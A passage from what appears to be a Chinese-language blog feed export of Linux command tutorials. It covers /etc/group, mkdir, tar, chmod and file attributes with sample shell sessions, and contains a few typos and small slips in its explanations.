/etc/grouproot:x:0:root,linuxsirbin:x:1:root,bin,daemondaemon:x:2:root,bin,daemonsys:x:3:root,bin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以 root:x:0:root,linuxsir 为例：用户组 root ，x 是密码段，表示没有设置木马，GID 是 0 ，root 用户组下包括 root、linuxsir 以及 GID 为0的其它用户。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- mkdir]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F3.%20Linux%20%E5%91%BD%E4%BB%A4-mkdir%2F</url>
    <content type="text"><![CDATA[Linux 命令-mkdir&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux mkdir 命令用来创建指定的名称的目录，要求创建目录的用户在当前目录中具有写权限，并且指定的目录名不能是当前目录中已有的目录。 1．命令格式：1mkdir [选项] [目录] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过 mkdir 命令可以实现在指定位置创建以 DirName(指定的文件名)命名的文件夹或目录。要创建文件夹或目录的用户必须对所创建的文件夹的父文件夹具有写权限。并且，所创建的文件夹(目录)不能与其父目录(即父文件夹)中的文件名重名，即同一个目录下不能有同名的(区分大小写)。 3．命令参数： -m, –mode=模式，设定权限&lt;模式&gt; (类似 chmod)，而不是 rwxrwxrwx 减 umask -p, –parents 可以是一个路径名称。此时若路径中的某些目录尚不存在,加上此选项后,系统将自动建立好那些尚不存在的目录,即一次可以建立多个目录; -v, –verbose 每次创建新目录都显示信息 –help 显示此帮助信息并退出 –version 输出版本信息并退出 4．命令实例：实例1：创建一个空目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir test1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345[root@localhost soft]# cd test[root@localhost test]# mkdir test1[root@localhost test]# ll总计 4drwxr-xr-x 2 root root 4096 10-25 17:42 test1[root@localhost test]# 实例2：递归创建多个目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir -p test2/test22 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# mkdir -p test2/test22[root@localhost test]# ll总计 8drwxr-xr-x 2 root root 4096 10-25 17:42 test1drwxr-xr-x 3 root root 4096 10-25 17:44 test2[root@localhost test]# cd test2/[root@localhost test2]# ll总计 4drwxr-xr-x 2 root root 4096 10-25 17:44 test22[root@localhost test2]# 实例3：创建权限为777的目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir -m 777 test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost test]# mkdir -m 777 test3[root@localhost test]# ll总计 12drwxr-xr-x 2 root root 4096 10-25 17:42 test1drwxr-xr-x 3 root root 4096 10-25 17:44 test2drwxrwxrwx 2 root root 4096 10-25 17:46 test3[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;test3 的权限为rwxrwxrwx 实例4：创建新目录都显示信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir -v test4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456[root@localhost test]# mkdir -v test4mkdir: 已创建目录 “test4”[root@localhost test]# mkdir -vp test5/test5-1mkdir: 已创建目录 “test5”mkdir: 已创建目录 “test5/test5-1”[root@localhost test]# 实例5：一个命令创建项目的目录结构&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参考：UNIX 高手的 10 个习惯 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1mkdir -vp scf/&#123;lib/,bin/,doc/&#123;info,product&#125;,logs/&#123;info,product&#125;,service/deploy/&#123;info,product&#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112131415161718192021222324252627282930[root@localhost test]# mkdir -vp scf/&#123;lib/,bin/,doc/&#123;info,product&#125;,logs/&#123;info,product&#125;,service/deploy/&#123;info,product&#125;&#125;mkdir: 已创建目录 “scf”mkdir: 已创建目录 “scf/lib”mkdir: 已创建目录 “scf/bin”mkdir: 已创建目录 “scf/doc”mkdir: 已创建目录 “scf/doc/info”mkdir: 已创建目录 “scf/doc/product”mkdir: 已创建目录 “scf/logs”mkdir: 已创建目录 “scf/logs/info”mkdir: 已创建目录 “scf/logs/product”mkdir: 已创建目录 “scf/service”mkdir: 已创建目录 “scf/service/deploy”mkdir: 已创建目录 “scf/service/deploy/info”mkdir: 已创建目录 “scf/service/deploy/product”[root@localhost test]# tree scf/scf/|-- bin|-- doc| |-- info| `-- product|-- lib|-- logs| |-- info| `-- product`-- service `-- deploy |-- info `-- product12 directories, 0 files[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tar]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F28.%20Linux%20%E5%91%BD%E4%BB%A4-%20tar%2F</url>
    <content type="text"><![CDATA[Linux 命令- tar&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过SSH访问服务器，难免会要用到压缩，解压缩，打包，解包等，这时候tar命令就是是必不可少的一个功能强大的工具。linux中最流行的tar是麻雀虽小，五脏俱全，功能强大。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tar命令可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux下最常用的打包程序就是tar了，使用tar程序打出来的包我们常称为tar包，tar包文件的命令通常都是以.tar结尾的。生成tar包后，就可以用其它的程序来进行压缩。 1.命令格式1tar [必要参数] [选择参数] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用来压缩和解压文件。tar 本身不具有压缩功能。它是调用压缩功能实现的。 3.命令参数必要参数 -A 新增压缩文件到已存在的压缩 -B 设置区块大小 -c 建立新的压缩文件 -d 记录文件的差别 -r 添加文件到已经压缩的文件 -u 添加改变了和现有的文件到已经存在的压缩文件 -x 从压缩的文件中提取文件 -t 显示压缩文件的内容 -z 支持gzip解压文件 -j 支持bzip2解压文件 -Z 支持compress解压文件 -v 显示操作过程 -l 文件系统边界设置 -k 保留原有文件不覆盖 -m 保留文件不被覆盖 -W 确认压缩文件的正确性 可选择参数 -b 设置区块数目 -C 切换到指定目录 -f 指定压缩文件 –help 显示帮助信息 –version 显示版本信息 4.常见压缩、解压命令tar&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解包 1tar xvf filname.tar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打包 1tar cvf filename.tar dirname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：tar 是打包，不是压缩！ .gz&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压1 1gunzip filename.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压2 1gzip -d filename.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1gzip filename.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1tar zxvf filename.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1tar zcvf filename.tar.gz dirname .bz2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压1 1bzip2 -d filename.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压2 1bunzip2 filename.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1bzip2 -z filename.tar.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1tar jxvf filename.tar.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1tar jcvf filename.tar.bz2 diename .Z&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1unconpress filename.Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1compress filename.tar.Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1tar Zxvf filename.tar.Z &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1tar Zcvf filename.tar.Z dirname .zip&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1unzip filename.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1zip filename.zip dirname .rar&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解压 1rar x filename.rar &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩 1rar a filename.rar dirname 5.使用实例实例1：将文件全部打包成 tar 包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123tar -cvf log.tar log2012.logtar -zxvf log.tar.gz log2012.logtar -jcvf log.tar.bz2 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@localhost test]# ls -al log2012.log---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# tar -cvf log.tar log2012.log log2012.log[root@localhost test]# tar -zcvf log.tar.gz log2012.loglog2012.log[root@localhost test]# tar -jcvf log.tar.bz2 log2012.log log2012.log[root@localhost test]# ls -al *.tar*-rw-r--r-- 1 root root 307200 11-29 17:54 log.tar-rw-r--r-- 1 root root 1413 11-29 17:55 log.tar.bz2-rw-r--r-- 1 root root 1413 11-29 17:54 log.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 tar -cvf log.tar log2012.log 仅打包，不压缩！ tar -zcvf log.tar.gz log2012.log 打包后，以 gzip 压缩 tar -zcvf log.tar.bz2 log2012.log 打包后，以 bzip2 压缩 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在参数 f 之后的文件档名是自己去的，习惯上都用 .tar 来作为辨识。如果加 z 参数，则以 .tar.gz 或 .tgz 来代表 gzip 压缩过的 tar 包；如果加 j 参数，则以 .tar.bz2 来作为 tar 报名。 实例2：查阅上述 tar 包内有哪些文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -ztvf log.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost test]# tar -ztvf log.tar.gz---xrw-r-- root/root 302108 2012-11-13 06:03:25 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于使用 gzip 压缩的 log.tar.gz，所以要查阅 log.tar.gz 包内的文件时，就要加上 z 这个参数 实例3：将 tar 包解压缩&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -zxvf /opt/soft/test/log.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test3]# ll总计 0[root@localhost test3]# tar -zxvf /opt/soft/test/log.tar.gzlog2012.log[root@localhost test3]# lslog2012.log[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在预设的情况下，可以将压缩当在任何地方解压 实例4：只将 /tar 内的部分文件解压出来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -zxvf /opt/soft/test/log30.tar.gz log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost test]# tar -zcvf log30.tar.gz log2012.log log2013.log log2012.loglog2013.log[root@localhost test]# ls -al log30.tar.gz -rw-r--r-- 1 root root 1512 11-30 08:19 log30.tar.gz[root@localhost test]# tar -zxvf log30.tar.gz log2013.loglog2013.log[root@localhost test]# ll-rw-r--r-- 1 root root 1512 11-30 08:19 log30.tar.gz[root@localhost test]# cd test3[root@localhost test3]# tar -zxvf /opt/soft/test/log30.tar.gz log2013.loglog2013.log[root@localhost test3]# ll总计 4-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以投过 tar -ztvf 来查阅 tar 包内的文件名称，如果单只要一个文件，就可透过这个方式来解压部分文件！ 实例5：文件备份下来，并且保存其权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -zcvpf log31.tar.gz log2014.log log2015.log lo2016.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021[root@localhost test]# ll总计 0-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log-rw-r--r-- 1 root root 0 11-16 14:41 log2016.log[root@localhost test]# tar -zcvpf log31.tar.gz log2014.log log2015.log log2016.log log2014.loglog2015.loglog2016.log[root@localhost test]# cd test6[root@localhost test6]# ll[root@localhost test6]# tar -zxvpf /opt/soft/test/log31.tar.gz log2014.loglog2015.loglog2016.log[root@localhost test6]# ll总计 0-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log-rw-r--r-- 1 root root 0 11-16 14:41 log2016.log[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个 -p 的属性是很重要的，尤其是要保留原文本文件的属性时 实例6：在文件夹当中，比某个日期新的文件才备份&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar -N "2012/11/13" -zcvf log17.tar.gz test &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost soft]# tar -N "2012/11/13" -zcvf log17.tar.gz testtar: Treating date `2012/11/13' as 2012-11-13 00:00:00 + 0 nanosecondstest/test/log31.tar.gztest/log2014.logtest/linklog.logtest/log2015.logtest/log2013.logtest/log2012.logtest/log2017.logtest/log2016.logtest/log30.tar.gztest/log.tartest/log.tar.bz2test/log.tar.gz 实例7：备份文件夹内容是排除部分文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tar --exclide scf/service -zcvf scf.tar/gz scf/* &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost test]# tree scfscf|-- bin|-- doc|-- lib`-- service `-- deploy |-- info `-- product7 directories, 0 files[root@localhost test]# tar --exclude scf/service -zcvf scf.tar.gz scf/* scf/bin/scf/doc/scf/lib/[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- chmod]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F27.%20Linux%20%E5%91%BD%E4%BB%A4-%20chmod%2F</url>
    <content type="text"><![CDATA[Linux 命令- chmod&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chmod命令用于改变linux系统文件或目录的访问权限。用它控制文件或目录的访问权限。该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统中的每个文件和目录都有访问许可权限，用它来确定谁可以通过何种方式对文件和目录进行访问和操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件或目录的访问权限分为只读，只写和可执行三种。以文件为例，只读权限表示只允许读其内容，而禁止对其做任何的更改操作。可执行权限表示允许将该文件作为一个程序执行。文件被创建时，文件所有者自动拥有对该文件的读、写和可执行权限，以便于对文件的阅读和修改。用户也可根据需要把访问权限设置为需要的任何组合。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有三种不同类型的用户可对文件或目录进行访问：文件所有者，同组用户、其他用户。所有者一般是文件的创建者。所有者可以允许同组用户有权访问文件，还可以将文件的访问权限赋予系统中的其他用户。在这种情况下，系统中每一位用户都能访问该用户拥有的文件或目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一文件或目录的访问权限都有三组，每组用三位表示，分别为文件属主的读、写和执行权限；与属主同组的用户的读、写和执行权限；系统中其他用户的读、写和执行权限。当用ls -l命令显示文件或目录的详细信息时，最左边的一列为文件的访问权限。 例如： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ls -al &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost test]# ll -al总计 316lrwxrwxrwx 1 root root 11 11-22 06:58 linklog.log -&gt; log2012.log-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log-rw-r--r-- 1 root root 0 11-16 14:41 log2016.log-rw-r--r-- 1 root root 0 11-16 14:43 log2017.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以log2012.log为例： 1-rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一列共有10个位置，第一个字符指定了文件类型。在通常意义上，一个目录也是一个文件。如果第一个字符是横线，表示是一个非目录的文件。如果是d，表示是一个目录。从第二个字符开始到第十个共9个字符，3个字符一组，分别表示了3组用户对文件或者目录的权限。权限字符用横线代表空许可，r代表只读，w代表写，x代表可执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如： 1- rw- r-- r-- &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表示log2012.log是一个普通文件；log2012.log的属主有读写权限；与log2012.log属主同组的用户只有读权限；其他用户也只有读权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;确定了一个文件的访问权限后，用户可以利用Linux系统提供的chmod命令来重新设定不同的访问权限。也可以利用chown命令来更改某个文件或目录的所有者。利用chgrp命令来更改某个文件或目录的用户组。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chmod命令是非常重要的，用于改变文件或目录的访问权限。用户用它控制文件或目录的访问权限。chmod命令详细情况如下。 1.命令格式1chmod [-cfvR] [--help] [--version] mode file 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于改变文件或目录的访问权限，用它控制文件或目录的访问权限。 3.命令参数必要参数 -c 当发生改变时，报告处理信息 -f 错误信息不输出 -R 处理指定目录以及其子目录下的所有文件 -v 运行时显示详细处理信息 选择参数 –reference=&lt;目录或者文件&gt; 设置成具有指定目录或者文件具有相同的权限 –version 显示版本信息 &lt;权限范围&gt;+&lt;权限设置&gt; 使权限范围内的目录或者文件具有指定的权限 &lt;权限范围&gt;-&lt;权限设置&gt; 删除权限范围的目录或者文件的指定权限 &lt;权限范围&gt;=&lt;权限设置&gt; 设置权限范围内的目录或者文件的权限为指定的值 权限范围 u ：目录或者文件的当前的用户 g ：目录或者文件的当前的群组 o ：除了目录或者文件的当前用户或群组之外的用户或者群组 a ：所有的用户及群组 权限代号 r ：读权限，用数字4表示 w ：写权限，用数字2表示 x ：执行权限，用数字1表示 ：删除权限，用数字0表示 s ：特殊权限 该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。 文字设定法1chmod [who] [+|-|=] [mode] [filename] 数字设定法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们必须首先了解用数字表示的属性的含义：0表示没有权限，1表示可执行权限，2表示可写权限，4表示可读权限，然后将其相加。所以数字属性的格式应为3个从0到7的八进制数，其顺序是（u）（g）（o）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，如果想让某个文件的属主有“读/写”二种权限，需要把4（可读）+2（可写）＝6（读/写）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数字设定法的一般形式为： 1chmod [mode] [filename] 数字与字符对应关系如下&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;r=4，w=2，x=1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要rwx属性则4+2+1=7 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要rw-属性则4+2=6； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若要r-x属性则4+1=7。 4.使用实例实例1：增加文件所有用户组可执行权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod a+x log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# ls -al log2012.log -rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chmod a+x log2012.log [root@localhost test]# ls -al log2012.log -rwxr-xr-x 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即设定文件log2012.log的属性为：文件属主（u） 增加执行权限；与文件属主同组用户（g） 增加执行权限；其他用户（o） 增加执行权限。 实例2：同时修改不同用户权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod ug+w,o-x log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ls -al log2012.log -rwxr-xr-x 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chmod ug+w,o-x log2012.log [root@localhost test]# ls -al log2012.log -rwxrwxr-- 1 root root 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即设定文件log2012.log的属性为：文件属主（u） 增加写权限;与文件属主同组用户（g） 增加写权限;其他用户（o） 删除执行权限 实例3：删除文件权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod a-x log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ls -al log2012.log -rwxrwxr-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chmod a-x log2012.log [root@localhost test]# ls -al log2012.log -rw-rw-r-- 1 root root 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除所有用户的可执行权限 实例4：使用 “=” 设置权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod u=x log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ls -al log2012.log -rw-rw-r-- 1 root root 302108 11-13 06:03 log2012.log[root@localhost test]# chmod u=x log2012.log [root@localhost test]# ls -al log2012.log ---xrw-r-- 1 root root 302108 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;撤销原来所有的权限，然后使拥有者具有可读权限 实例5：对一个目录及其子目录所有文件添加权限&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod -R u+x test4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost test]# cd test4[root@localhost test4]# ls -al总计 312drwxrwxr-x 2 root root 4096 11-13 05:50 .drwxr-xr-x 5 root root 4096 11-22 06:58 ..-rw-r--r-- 1 root root 302108 11-12 22:54 log2012.log-rw-r--r-- 1 root root 61 11-12 22:54 log2013.log-rw-r--r-- 1 root root 0 11-12 22:54 log2014.log[root@localhost test4]# cd ..[root@localhost test]# chmod -R u+x test4[root@localhost test]# cd test4[root@localhost test4]# ls -al总计 312drwxrwxr-x 2 root root 4096 11-13 05:50 .drwxr-xr-x 5 root root 4096 11-22 06:58 ..-rwxr--r-- 1 root root 302108 11-12 22:54 log2012.log-rwxr--r-- 1 root root 61 11-12 22:54 log2013.log-rwxr--r-- 1 root root 0 11-12 22:54 log2014.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;递归地给test4目录下所有文件和子目录的属主分配权限 其他一些实例1.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod 751 file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;给 file 的属主分配读、写、执行（7）的权限，给 file 的所在组分配读、执行（5）的权限，给其他用户分配执行（1）的权限 2.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod u=rwx,g=rx,o=x file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例的另一种形式 3.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod a=r file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为所有用户分配读权限 4.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod 444 file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同上例 5.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chmod a-wx,a+r file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同上例]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件属性详解]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F25.%20Linux%20%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Linux 文件属性详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 文件或目录的属性主要包括：文件或目录的节点、种类、权限模式、链接数量、所归属的用户和用户组、最近访问或修改的时间等内容。具体情况如下： 命令1ls -lih 输出123456789101112[root@localhost test]# ls -lih总计 316K2095120 lrwxrwxrwx 1 root root 11 11-22 06:58 linklog.log -&gt; log2012.log2095112 -rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log2095110 -rw-r--r-- 1 root root 61 11-13 06:03 log2013.log2095107 -rw-r--r-- 1 root root 0 11-13 06:03 log2014.log2095117 -rw-r--r-- 1 root root 0 11-13 06:06 log2015.log2095118 -rw-r--r-- 1 root root 0 11-16 14:41 log2016.log2095119 -rw-r--r-- 1 root root 0 11-16 14:43 log2017.log2095113 drwxr-xr-x 6 root root 4.0K 10-27 01:58 scf2095109 drwxrwxr-x 2 root root 4.0K 11-13 06:08 test32095131 drwxrwxr-x 2 root root 4.0K 11-13 05:50 test4 说明 第一列：inode 第二列：文件种类和权限； 第三列： 硬链接个数； 第四列： 属主； 第五列：所归属的组； 第六列：文件或目录的大小； 第七列和第八列：最后访问或修改时间； 第九列：文件名或目录名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以 log2012.log 为例： 12095112 -rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件类型：文件类型是-，表示这是一个普通文件； 关于文件的类型，请参考：Linux文件类型与扩展名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件权限：文件权限是rw-r–r– ，表示文件属主可读、可写、不可执行，文件所归属的用户组不可写，可读，不可执行，其它用户不可写，可读，不可执行； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;硬链接个数： log2012.log这个文件没有硬链接；因为数值是1，就是他本身； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件属主：也就是这个文件归哪于哪个用户 ，它归于root，也就是第一个root； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件属组：也就是说，对于这个文件，它归属于哪个用户组，在这里是root用户组； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件大小：文件大小是296k个字节； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;访问可修改时间 ：这里的时间是最后访问的时间，最后访问和文件被修改或创建的时间，有时并不是一致的； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然文档的属性不仅仅包括这些，这些是我们最常用的一些属性。 关于 inode&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;inode 译成中文就是索引节点。每个存储设备或存储设备的分区（存储设备是硬盘、软盘、U盘等等）被格式化为文件系统后，应该有两部份，一部份是inode，另一部份是Block，Block是用来存储数据用的。而inode呢，就是用来存储这些数 据的信息，这些信息包括文件大小、属主、归属的用户组、读写权限等。inode为每个文件进行信息索引，所以就有了inode的数值。操作系统根据指令， 能通过inode值最快的找到相对应的文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;做个比喻，比如一本书，存储设备或分区就相当于这本书，Block相当于书中的每一页，inode 